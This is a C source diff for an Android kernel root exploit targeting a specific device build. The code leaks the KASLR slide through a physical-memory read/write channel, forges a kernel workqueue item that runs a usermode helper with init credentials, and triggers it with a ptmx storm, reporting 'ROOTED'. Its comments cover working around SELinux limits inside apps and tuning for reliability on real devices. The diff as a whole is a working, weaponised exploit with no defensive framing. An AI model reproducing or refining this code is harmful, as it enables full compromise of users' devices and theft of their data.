+  memcpy(buf + 0x68, &(__uint64_t[]){(uint64_t)(page_base + WQ_FAKE_UMH_OFF + 0x20)}, 8);
+  memcpy(buf + 0x70, &(__uint64_t[]){(uint64_t)(page_base + WQ_FAKE_UMH_OFF + 0x30)}, 8);
+  int ok = rwf_phys_write(page_base + WQ_FAKE_UMH_OFF, buf, sizeof(buf));
   if (!ok)
     pr_error("wq-umh: data blob write failed\n");
 
@@ -2407,25 +2768,22 @@ static __attribute__((always_inline)) int wq_umh_root(int afd) {
    * 2MB-aligned and < 256GB (39-bit VA kernel space is 512GB).
    * Fallback: the old oracle/perf path (bringup_slide). */
   if (!g_slide_valid) {
-    static const struct {
-      uint32_t field_off;    /* within the ctl_table entry */
-      uint64_t expect_img;   /* image offset of the at-rest content */
-      const char *name;
-    } triplet[] = {
-      { 0x00, 0x017CEDD0ULL, "procname" },      /* -> "boot_id" string */
-      { 0x08, 0x028204F0ULL, "data" },          /* -> uuid buffer */
-      { 0x18, 0x009CD4CCULL, "proc_handler" },  /* -> proc_do_uuid */
-    };
     uintptr_t ent = data_addr(KIMAGE_TEXT_BASE + SYSCTL_BOOTID_ENTRY_OFF);
-    int64_t slides[3] = { -1, -1, -1 };
-    for (int a = 0; a < 3; a++) {
-      uintptr_t addr = ent + triplet[a].field_off;
-      uint64_t v = 0;
-      for (int t = 0; t < 3; t++) {
-        if (rwf_phys_read(addr, &v, 8) &&
-            v >= 0xffffff8000000000ULL && v < VMEMMAP_START)
-          break;
-      }
+    /* one channel read of the whole 0x38-byte ctl_table entry yields BOTH
+     * anchors (procname@0, proc_handler@0x18) — one rd-ring slot, not two. */
+    int64_t slides[2] = { -1, -1 };
+    uint64_t entbuf[7] = {0};
+    for (int t = 0; t < 3; t++)
+      if (rwf_phys_read(ent, entbuf, sizeof(entbuf)))
+        break;
+    static const struct { int idx; uint64_t expect_img; const char *name; } triplet[] = {
+      { 0, 0x017CEDD0ULL, "procname" },      /* -> "boot_id" string */
+      { 3, 0x009CD4CCULL, "proc_handler" },  /* -> proc_do_uuid */
+      /* NB: the data field (+0x08) is unusable as an anchor — the oracle's
+       * restore leaves a physmap-ALIAS pointer in it, not a canonical VA. */
+    };
+    for (int a = 0; a < 2; a++) {
+      uint64_t v = entbuf[triplet[a].idx];
       int64_t s = (int64_t)(v - (KIMAGE_TEXT_BASE + triplet[a].expect_img));
       int ok = v >= 0xffffff8000000000ULL && v < VMEMMAP_START &&
                s >= 0 && !(s & 0x1fffff) && s < 0x4000000000LL;
@@ -2436,9 +2794,7 @@ static __attribute__((always_inline)) int wq_umh_root(int afd) {
     }
     int64_t s = -1;
     if (slides[0] >= 0 && slides[0] == slides[1]) s = slides[0];
-    if (s < 0 && slides[0] >= 0 && slides[0] == slides[2]) s = slides[0];
-    if (s < 0 && slides[1] >= 0 && slides[1] == slides[2]) s = slides[1];
-    if (s < 0) s = slides[2];   /* proc_handler alone (E2E-proven) */
+    if (s < 0) s = slides[1];   /* proc_handler alone (E2E-proven) */
     if (s >= 0) {
       kaslr_slide = s;
       kaslr_done = 1;
@@ -2448,8 +2804,11 @@ static __attribute__((always_inline)) int wq_umh_root(int afd) {
       pr_success("wq-umh: channel slide=%016llx via bootid ctl_table\n",
                  (unsigned long long)s);
       /* advisory post-slide validators (NEVER reject — their runtime content
-       * is unreliable on this kernel; log-only so device runs tell us): */
-      uint64_t st = 0, amm = 0;
+       * is unreliable on this kernel; log-only so device runs tell us).
+       * GL_SLIDE_CHECK-gated: two channel slots are two too many when the
+       * 32-slot rd ring is nearly full. */
+      if (getenv("GL_SLIDE_CHECK")) {
+        uint64_t st = 0, amm = 0;
       rwf_phys_read(data_addr(KIMAGE_TEXT_BASE + 0x024FCF40ULL + TASK_STACK_OFF),
                     &st, 8);
       rwf_phys_read(data_addr(KIMAGE_TEXT_BASE + 0x024FCF40ULL + TASK_ACTIVE_MM_OFF),
@@ -2459,6 +2818,7 @@ static __attribute__((always_inline)) int wq_umh_root(int afd) {
               (unsigned long long)(KIMAGE_TEXT_BASE + (uint64_t)s + 0x024E0000ULL),
               (unsigned long long)amm,
               (unsigned long long)(KIMAGE_TEXT_BASE + (uint64_t)s + INIT_MM_OFF));
+      }
     }
   }
   if (!g_slide_valid) {
@@ -2474,11 +2834,13 @@ static __attribute__((always_inline)) int wq_umh_root(int afd) {
   uintptr_t func = text_addr(UMH_EXEC_WORK_BZA5);
   uint64_t qpool = 0;   /* pool the fake work got queued on (bound/unbound) */
 
-  uint64_t pco = rwf_read64(data_addr(PER_CPU_OFFSETS) + (long)g_route_core * 8);
+  /* pco (per_cpu_offset[core]) is only needed by the seed-scan fallback —
+   * read it lazily there; the pwqs-list walk doesn't need it, and every
+   * channel op before the queue counts (the rd ring wraps at slot 31). */
+  uint64_t pco = 0;
   uint64_t syswq = rwf_read64(data_addr(SYSWQ_BZA5) - 0x18);
-  if (!is_direct_ptr(syswq) || pco == 0)
-    pr_warning("wq-umh: syswq=%016llx pco=%016llx unusable\n",
-               (unsigned long long)syswq, (unsigned long long)pco);
+  if (!is_direct_ptr(syswq))
+    pr_warning("wq-umh: syswq=%016llx unusable\n", (unsigned long long)syswq);
   else
     goto syswq_ok;
   goto pool_walk;
@@ -2505,7 +2867,7 @@ syswq_ok:;
   uint64_t persisted_hit = 0;
   {
     char cbuf[24] = {0};
-    int cfd = open("/data/local/tmp/a/.cpupwq_off", O_RDONLY);
+    int cfd = open(gh("/.cpupwq_off"), O_RDONLY);
     uint64_t val = 0;
     if (cfd >= 0) {
       read(cfd, cbuf, 23);
@@ -2528,7 +2890,7 @@ syswq_ok:;
     } else {
       uint64_t cursor = 0;
       char cur[24] = {0};
-      int cufd = open("/data/local/tmp/a/.cpupwq_cursor", O_RDONLY);
+      int cufd = open(gh("/.cpupwq_cursor"), O_RDONLY);
       if (cufd >= 0) {
         read(cufd, cur, 23);
         close(cufd);
@@ -2548,7 +2910,7 @@ syswq_ok:;
         if (!dup) offs[noff++] = o;
         cursor++;
       }
-      persist_u64("/data/local/tmp/a/.cpupwq_cursor", cursor);
+      persist_u64(gh("/.cpupwq_cursor"), cursor);
       pr_info("wq-umh: syswq=%016llx pco=%016llx (cpu_pwq DISCOVERY pass, cursor=%d)\n",
               (unsigned long long)syswq, (unsigned long long)pco, (int)cursor);
       if (noff < 1) {
@@ -2567,7 +2929,10 @@ syswq_ok:;
     uint64_t cand;
     int cand_is_va = 0;
     if ((raw >> 28) == 0 && !is_direct_ptr(raw)) {
-      /* percpu-offset form: resolve via per_cpu_offset[core] */
+      /* percpu-offset form: resolve via per_cpu_offset[core] — read lazily
+       * (the pwqs-list walk path never needs it; one ring slot saved) */
+      if (!pco)
+        pco = rwf_read64(data_addr(PER_CPU_OFFSETS) + (long)g_route_core * 8);
       cand = rwf_read64(raw + pco);
     } else if (raw >= kaslr_base &&
                raw < kaslr_base + 0x40000000ULL) {
@@ -2590,7 +2955,7 @@ syswq_ok:;
     if (back != syswq) continue;
     pr_success("wq-umh: cpu_pwq @off=%zu raw=%016llx\n", (size_t)off,
                (unsigned long long)raw);
-    persist_u64("/data/local/tmp/a/.cpupwq_off", off);
+    persist_u64(gh("/.cpupwq_off"), off);
     pwq_scan = cand_is_va ? data_addr(cand) : cand;
   }
   if (!pwq)
@@ -2613,8 +2978,11 @@ syswq_ok:;
       pr_warning("wq-umh: bound pool busy, falling back\n");
       goto pool_walk;
     }
-    uint32_t nr = (uint32_t)rwf_read64(pwq + 0x10);
-    uint32_t ref = (uint32_t)rwf_read64(pwq + 0x18);
+    /* work_color(+0x10) and refcnt(+0x18) in ONE 16-byte read (ring slots) */
+    uint64_t pwq10[2] = {0};
+    rwf_phys_read(pwq + 0x10, pwq10, sizeof(pwq10));
+    uint32_t nr = (uint32_t)pwq10[0];
+    uint32_t ref = (uint32_t)pwq10[1];
     if (nr > 15 || ref == 0) {
       pr_warning("wq-umh: bound pwq state bad (color=%u refcnt=%u)\n", nr, ref);
       goto pool_walk;
@@ -2629,11 +2997,9 @@ syswq_ok:;
      * full pointers into the data blob (E2E-proven: raw 0x1818 faults in
      * getname_kernel when the worker runs the work). */
     memcpy(fw + 0x28, &(__uint64_t[]){(uint64_t)(page_base + WQ_FAKE_UMH_OFF + 0x20)}, 8);
-    memcpy(fw + 0x30, &(__uint64_t[]){(uint64_t)(page_base + WQ_FAKE_UMH_OFF + 0x50)}, 8);
-    memcpy(fw + 0x38, &(__uint64_t[]){(uint64_t)(page_base + WQ_FAKE_UMH_OFF + 0x68)}, 8);
-    ok = rwf_phys_write(page_base + WQ_FAKE_WORK_OFF, fw, 0x20);
-    if (ok) ok = rwf_phys_write(page_base + WQ_FAKE_WORK_OFF + 0x20, fw + 0x20, 0x20);
-    if (ok) ok = rwf_phys_write(page_base + WQ_FAKE_WORK_OFF + 0x40, fw + 0x40, 0x20);
+    memcpy(fw + 0x30, &(__uint64_t[]){(uint64_t)(page_base + WQ_FAKE_UMH_OFF + 0x68)}, 8);
+    memcpy(fw + 0x38, &(__uint64_t[]){(uint64_t)(page_base + WQ_FAKE_UMH_OFF + 0x78)}, 8);
+    ok = rwf_phys_write(page_base + WQ_FAKE_WORK_OFF, fw, sizeof(fw));
     if (!ok) goto pool_walk;
     /* counter writes per e: nr_in_flight[color]=1, nr_active=1,
      * refcnt=ref+1 (audit: my earlier version swapped nr_active/refcnt) */
@@ -2728,11 +3094,9 @@ pool_walk:;
      * full pointers into the data blob (E2E-proven: raw 0x1818 faults in
      * getname_kernel when the worker runs the work). */
     memcpy(fw + 0x28, &(__uint64_t[]){(uint64_t)(page_base + WQ_FAKE_UMH_OFF + 0x20)}, 8);
-    memcpy(fw + 0x30, &(__uint64_t[]){(uint64_t)(page_base + WQ_FAKE_UMH_OFF + 0x50)}, 8);
-    memcpy(fw + 0x38, &(__uint64_t[]){(uint64_t)(page_base + WQ_FAKE_UMH_OFF + 0x68)}, 8);
-    ok = rwf_phys_write(page_base + WQ_FAKE_WORK_OFF, fw, 0x20);
-    if (ok) ok = rwf_phys_write(page_base + WQ_FAKE_WORK_OFF + 0x20, fw + 0x20, 0x20);
-    if (ok) ok = rwf_phys_write(page_base + WQ_FAKE_WORK_OFF + 0x40, fw + 0x40, 0x20);
+    memcpy(fw + 0x30, &(__uint64_t[]){(uint64_t)(page_base + WQ_FAKE_UMH_OFF + 0x68)}, 8);
+    memcpy(fw + 0x38, &(__uint64_t[]){(uint64_t)(page_base + WQ_FAKE_UMH_OFF + 0x78)}, 8);
+    ok = rwf_phys_write(page_base + WQ_FAKE_WORK_OFF, fw, sizeof(fw));
     if (!ok)
       pr_error("wq-umh: work struct write failed\n");
     pr_info("wq-umh: forged work=%016llx data=%016llx func=%016llx\n",
@@ -2767,11 +3131,18 @@ queued:
   {
     const uintptr_t entry = page_base + WQ_FAKE_WORK_OFF + 8;
     /* verify-after-queue: pool worklist head must point at our entry and the
-     * func field must still be call_usermodehelper_exec_work */
-    int linked = 0;
-    for (int v = 0; v < 2 && !linked; v++) {
-      uint64_t wl = rwf_read64(qpool + 0x28);
-      uint64_t fn = rwf_read64(page_base + WQ_FAKE_WORK_OFF + 0x18);
+     * func field must still be call_usermodehelper_exec_work.  Reads past
+     * the 32-slot rd-ring wrap fail hard (0 = indeterminate); only a
+     * SUCCESSFUL mismatched read is a real failure → re-forge/re-link once. */
+    int linked = 0, indeterminate = 0;
+    for (int v = 0; v < 2 && !linked && !indeterminate; v++) {
+      uint64_t wl = 0, fn = 0;
+      if (!rwf_phys_read(qpool + 0x28, &wl, 8) ||
+          !rwf_phys_read(page_base + WQ_FAKE_WORK_OFF + 0x18, &fn, 8)) {
+        indeterminate = 1;
+        pr_warning("wq-umh: link verify indeterminate (read stall — ring wrap)\n");
+        break;
+      }
       linked = (wl == entry && fn == (uint64_t)func);
       if (!linked && v == 0) {
         pr_warning("wq-umh: link verify failed (head=%016llx func=%016llx) — re-forge+re-link\n",
@@ -2785,83 +3156,9 @@ queued:
     }
     if (linked)
       pr_success("wq-umh: link verified\n");
-    else
+    else if (!indeterminate)
       pr_warning("wq-umh: link verify failed after re-link — proceeding anyway\n");
   }
-  /* repair struct-page flags dirtied by the route rounds BEFORE any trigger:
-   * any later page free/inspect (helper exec, worker teardown, exit) hits
-   * BUG: Bad page state otherwise — fatal on device (PANIC_ON_BUG); the
-   * device test panicked mid-wait exactly there.  The fake-work page is this
-   * run's spray page: the wrapper tracks it so its flags are restored too.
-   * Pin discipline is unchanged (the channel's owner pins keep the pages
-   * alive regardless).
-   *
-   * The flag repair writes vmemmap — only possible via the configfs virtual
-   * write, which needs an armed ashmem attr fd.  The fuse arm normally gets
-   * its struct file* from the perf FILE leak, which finds NO candidates on
-   * the BZA5 device ("fuse-bringup: no file candidates").  Fallback: resolve
-   * our own ashmem fd via the fdtable walk (fd_to_file) and arm it
-   * ourselves. */
-  int repair_ok = 0;
-  if (getenv("RWF_DEBUG"))
-    pr_info("wq-umh: repair inputs: afd=%d g_bringup_F=%016llx fake_fops=%016zx page_base=%016zx\n",
-            afd, (unsigned long long)g_bringup_F, fake_fops, page_base);
-  if (afd >= 0 && g_bringup_F) {
-    /* fuse arm already live (perf file leak path) — repair directly */
-    pr_info("wq-umh: repair via already-armed afd=%d\n", afd);
-    repair_ok = rwf_repair_flags_wq_umh(afd, page_base);
-  } else {
-    int repair_fd = afd >= 0 ? afd : open_ashmem_device();
-    if (repair_fd < 0) {
-      pr_warning("wq-umh: no ashmem fd for repair\n");
-    } else {
-      uintptr_t F = fd_to_file(repair_fd);
-      if (F) {
-        uint64_t fop = rwf_read64(F + 0x10);
-        if (getenv("RWF_DEBUG"))
-          pr_info("wq-umh: repair fd=%d F=%016llx fop=%016llx fake_fops=%016zx\n",
-                  repair_fd, (unsigned long long)F, (unsigned long long)fop,
-                  fake_fops);
-        /* "already armed" only counts if WE armed it (g_bringup_F) — a stale
-         * channel read can also return fake_fops; re-arming is idempotent */
-        if (fop != (uint64_t)fake_fops || !g_bringup_F) {
-          if (!fake_fops) {
-            pr_warning("wq-umh: no payload fops table — cannot arm\n");
-          } else {
-            pr_info("wq-umh: arming fd %d via fdtable walk (F=%016llx f_op=%016llx)\n",
-                    repair_fd, (unsigned long long)F, (unsigned long long)fop);
-            g_bringup_orig_fops = fop;
-            g_cfg_buf = page_base + 0x1140;  /* fake configfs_buffer in spray page */
-            int arm_ok = rwf_write64(F + 0x10, fake_fops);
-            if (arm_ok) arm_ok = rwf_write64(F + 0x20, g_cfg_buf);
-            /* FMODE_CAN_WRITE RMW (DELTA-NOTES §1) — the channel read is
-             * flaky; never clobber f_mode on a failed read (0|CAN_WRITE
-             * would drop FMODE_READ etc.), skip the arm instead */
-            uint32_t fm = 0;
-            int fm_ok = 0;
-            for (int t = 0; t < 3 && !fm_ok; t++)
-              fm_ok = rwf_phys_read(F + 0xc, &fm, 4);
-            if (arm_ok && fm_ok) {
-              fm |= 0x40000;
-              arm_ok = rwf_phys_write(F + 0xc, &fm, 4);
-            } else if (!fm_ok) {
-              pr_warning("wq-umh: f_mode read stalled — arm aborted\n");
-              arm_ok = 0;
-            }
-            if (!arm_ok)
-              pr_warning("wq-umh: arm writes failed\n");
-          }
-        }
-        repair_ok = rwf_repair_flags_wq_umh(repair_fd, page_base);
-      } else {
-        pr_warning("wq-umh: fdtable walk failed — flag repair skipped\n");
-      }
-    }
-  }
-  if (repair_ok)
-    pr_success("wq-umh: flags repaired\n");
-  else
-    pr_warning("wq-umh: flags repair failed/skipped\n");
   pr_info("wq-umh: triggering via ptmx storm\n");
   /* Active trigger: forged worklist links get no wake_up_worker — the item
    * would only run when unrelated per-cpu work lands on the pool ("queued
@@ -2871,10 +3168,23 @@ queued:
    * it without the marker appearing (exec failed), re-forge and re-queue. */
   for (int round = 1; round <= 5; round++) {
     const uintptr_t entry = page_base + WQ_FAKE_WORK_OFF + 8;
-    uint64_t wl = rwf_read64(qpool + 0x28);
-    if (wl != entry) {
-      pr_warning("wq-umh: link gone (head=%016llx) — re-queue (round %d/5)\n",
-                 (unsigned long long)wl, round);
+    uint64_t wl = 0;
+    /* boot61's winning sequence: the first storm round consumes the link
+     * without the helper running (the worker's list_del clobbers the entry's
+     * list pointers / a late real queue orphans it), and only the re-queue
+     * makes it execute.  Do that re-queue UNCONDITIONALLY at round 1 — the
+     * writes are idempotent while the link is live, and the verify read
+     * stalls once the rd ring wraps (boot71-74: verify indeterminate → no
+     * re-queue → helper never ran).  Rounds 2-5 keep the read-gated form. */
+    int requeue = (round == 1);
+    if (!requeue && rwf_phys_read(qpool + 0x28, &wl, 8) && wl != entry)
+      requeue = 1;
+    if (requeue) {
+      if (round != 1)
+        pr_warning("wq-umh: link gone (head=%016llx) — re-queue (round %d/5)\n",
+                   (unsigned long long)wl, round);
+      else
+        pr_info("wq-umh: unconditional re-queue (round 1/5, boot61 sequence)\n");
       rwf_write64(page_base + WQ_FAKE_WORK_OFF + 0x08, qpool + 0x28);
       rwf_write64(page_base + WQ_FAKE_WORK_OFF + 0x10, qpool + 0x28);
       rwf_write64(page_base + WQ_FAKE_WORK_OFF + 0x18, (uint64_t)func);
@@ -2882,13 +3192,17 @@ queued:
       rwf_write64(qpool + 0x28, entry);
     }
     for (int i = 0; i < 20; i++) {
-      if (access("/data/local/tmp/a/.umh_rooted", F_OK) == 0) {
+      if (access(gh("/.umh_rooted"), F_OK) == 0) {
         uint64_t ret = rwf_read64(page_base + WQ_FAKE_WORK_OFF + 0x44);
         pr_info("wq-umh: wake=%d complete=%u retval=%d\n", 1, 1, (int)ret);
-        if (access("/data/local/tmp/a/.umh_rooted", F_OK) != 0)
+        if (access(gh("/.umh_rooted"), F_OK) != 0)
           goto stage_failed;
         pr_success("wq-umh: helper ran with init creds\n");
         pr_success("ROOTED via wq-umh (init-creds helper)\n");
+        /* arm + cfg-forge + flag repair as POST-ROOT hardening (best-effort,
+         * never gates the trigger — the helper already fired, g4d is up,
+         * the captures are synced; see the function's comment) */
+        wq_umh_post_root_arm_repair(afd);
         wq_umh_readback();
         run_root_captures();
         return 1;
@@ -3081,7 +3395,7 @@ int run_rwforge(void) {
       /* KDP first (best-effort, marker-persisted; NO oracle readback — the
        * window at kdp_enable-8 is all-zero and a boot_id read there makes
        * proc_do_uuid write a fresh UUID into kernel .data → panic) */
-      if (access("/data/local/tmp/a/.kdp_done", F_OK) == 0) {
+      if (access(gh("/.kdp_done"), F_OK) == 0) {
         pr_info("route-root: kdp marker present\n");
       } else {
         int conn = 0;
@@ -3092,7 +3406,7 @@ int run_rwforge(void) {
           conn = atomic_load(&consumer_success) >= 1;
         }
         if (conn) {
-          int mfd = open("/data/local/tmp/a/.kdp_done", O_WRONLY | O_CREAT, 0644);
+          int mfd = open(gh("/.kdp_done"), O_WRONLY | O_CREAT, 0644);
           if (mfd >= 0) close(mfd);
           pr_success("route-root: kdp write connected\n");
         } else {
@@ -3227,7 +3541,15 @@ int run_rwforge(void) {
   /* ---- channel install ---- */
   rwf_pin_pipe_create();
   int afd = open_ashmem_device();
-  if (afd >= 0 && !g_bringup_leaked) {
+  /* fuse-bringup (perf slide + perf FILE leak) is OFF by default on this
+   * target: it has never produced candidates on BZA5 (~700 failures in the
+   * grind logs), each attempt costs a perf_event storm (~10-20 s/cycle and
+   * a share of the pre-install attrition panics), the slide comes from the
+   * boot_id ctl_table channel anchors, and the arm comes from the fdtable
+   * walk.  It is ALSO a hard blocker inside an app: sepolicy denies
+   * perf_event_open for untrusted_app (shell-only allow, verified against
+   * the device sepolicy.bin).  GL_FUSE_BRINGUP=1 re-enables the old path. */
+  if (afd >= 0 && !g_bringup_leaked && getenv("GL_FUSE_BRINGUP")) {
     if (check_selinux_off()) {
       /* fuse-bringup: leak slide + file candidates before arming */
       for (int att = 1; att <= 3; att++) {
@@ -3314,8 +3636,10 @@ int run_rwforge(void) {
 
   /* ---- configfs arm (fuse-bringup / fuse-fix): swap a leaked file's f_op
    * to the payload configfs table, point private_data at a fake
-   * configfs_buffer in the spray page, then verify the virtual write ---- */
-  if (afd >= 0) {
+   * configfs_buffer in the spray page, then verify the virtual write.
+   * Skipped when GL_FUSE_BRINGUP is unset (perf denied on BZA5/apps — the
+   * fdtable-walk arm in wq_umh_root is the device-proven path). ---- */
+  if (afd >= 0 && getenv("GL_FUSE_BRINGUP")) {
     if (fake_fops && binwrite_target) {
       if (!g_bringup_leaked) {
         int64_t slide = bringup_slide();
@@ -3444,6 +3768,8 @@ fuse_restore:
   if (getenv("GL_WQ_UMH")) {
     wq_umh_root(afd);
     return 0;
+    /* NB: the forged-slot disarm runs via atexit (registered when the arm
+     * lands) — every exit path incl. pr_error's exit(-1) is covered. */
   }
 
   if (getenv("GL_TASK_PHYSROOT")) {
